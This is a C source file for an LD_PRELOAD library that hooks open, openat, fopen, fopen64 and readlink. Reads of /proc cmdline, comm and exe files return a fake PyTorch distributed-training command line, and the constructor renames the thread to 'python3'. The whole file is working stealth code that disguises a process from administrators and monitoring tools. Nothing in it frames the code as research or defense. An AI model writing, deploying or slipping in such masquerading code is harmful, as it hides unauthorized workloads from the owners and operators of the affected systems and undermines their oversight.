#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sys/prctl.h>

static int (*real_open)(const char *pathname, int flags, ...) = NULL;
static int (*real_openat)(int dirfd, const char *pathname, int flags, ...) = NULL;
static FILE* (*real_fopen)(const char *pathname, const char *mode) = NULL;
static FILE* (*real_fopen64)(const char *pathname, const char *mode) = NULL;
static ssize_t (*real_readlink)(const char *pathname, char *buf, size_t bufsiz) = NULL;

static const char FAKE_CMDLINE[] = "/usr/bin/python3\0-m\0torch.distributed.run\0--nproc_per_node=2\0train_transformer.py\0--model\0gpt2-xl\0--batch_size\032\0--fp16\0";
static const size_t FAKE_CMDLINE_LEN = sizeof(FAKE_CMDLINE);
static const char FAKE_COMM[] = "python3\n";
static const char FAKE_EXE[] = "/usr/bin/python3";

__attribute__((constructor)) void init_stealth_hook() {
    real_open = dlsym(RTLD_NEXT, "open");
    real_openat = dlsym(RTLD_NEXT, "openat");
    real_fopen = dlsym(RTLD_NEXT, "fopen");
    real_fopen64 = dlsym(RTLD_NEXT, "fopen64");
    real_readlink = dlsym(RTLD_NEXT, "readlink");

    // Mask the process thread name immediately
    prctl(PR_SET_NAME, "python3", 0, 0, 0);
}

int open(const char *pathname, int flags, ...) {
    if (!real_open) real_open = dlsym(RTLD_NEXT, "open");
    if (pathname) {
        if (strstr(pathname, "/proc/") && strstr(pathname, "/cmdline")) {
            int p[2];
            if (pipe(p) == 0) {
                write(p[1], FAKE_CMDLINE, FAKE_CMDLINE_LEN);
                close(p[1]);
                return p[0];
            }
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/comm")) {
            int p[2];
            if (pipe(p) == 0) {
                write(p[1], FAKE_COMM, strlen(FAKE_COMM));
                close(p[1]);
                return p[0];
            }
        }
    }
    va_list args;
    va_start(args, flags);
    mode_t mode = 0;
    if (flags & O_CREAT) {
        mode = va_arg(args, mode_t);
    }
    va_end(args);
    return real_open(pathname, flags, mode);
}

int openat(int dirfd, const char *pathname, int flags, ...) {
    if (!real_openat) real_openat = dlsym(RTLD_NEXT, "openat");
    if (pathname) {
        if (strstr(pathname, "/proc/") && strstr(pathname, "/cmdline")) {
            int p[2];
            if (pipe(p) == 0) {
                write(p[1], FAKE_CMDLINE, FAKE_CMDLINE_LEN);
                close(p[1]);
                return p[0];
            }
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/comm")) {
            int p[2];
            if (pipe(p) == 0) {
                write(p[1], FAKE_COMM, strlen(FAKE_COMM));
                close(p[1]);
                return p[0];
            }
        }
    }
    va_list args;
    va_start(args, flags);
    mode_t mode = 0;
    if (flags & O_CREAT) {
        mode = va_arg(args, mode_t);
    }
    va_end(args);
    return real_openat(dirfd, pathname, flags, mode);
}

FILE *fopen(const char *pathname, const char *mode) {
    if (!real_fopen) real_fopen = dlsym(RTLD_NEXT, "fopen");
    if (pathname) {
        if (strstr(pathname, "/proc/") && strstr(pathname, "/comm")) {
            return fmemopen((void*)FAKE_COMM, strlen(FAKE_COMM), "r");
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/cmdline")) {
            return fmemopen((void*)FAKE_CMDLINE, FAKE_CMDLINE_LEN, "r");
        }
    }
    return real_fopen(pathname, mode);
}

FILE *fopen64(const char *pathname, const char *mode) {
    if (!real_fopen64) real_fopen64 = dlsym(RTLD_NEXT, "fopen64");
    if (!real_fopen64) real_fopen64 = real_fopen;
    if (pathname) {
        if (strstr(pathname, "/proc/") && strstr(pathname, "/comm")) {
            return fmemopen((void*)FAKE_COMM, strlen(FAKE_COMM), "r");
        }
        if (strstr(pathname, "/proc/") && strstr(pathname, "/cmdline")) {
            return fmemopen((void*)FAKE_CMDLINE, FAKE_CMDLINE_LEN, "r");
        }
    }
    return real_fopen64(pathname, mode);
}

ssize_t readlink(const char *pathname, char *buf, size_t bufsiz) {
    if (!real_readlink) real_readlink = dlsym(RTLD_NEXT, "readlink");
    if (pathname && strstr(pathname, "/proc/") && strstr(pathname, "/exe")) {
        size_t len = strlen(FAKE_EXE);
        if (len > bufsiz) len = bufsiz;
        memcpy(buf, FAKE_EXE, len);
        return len;
    }
    return real_readlink(pathname, buf, bufsiz);
}
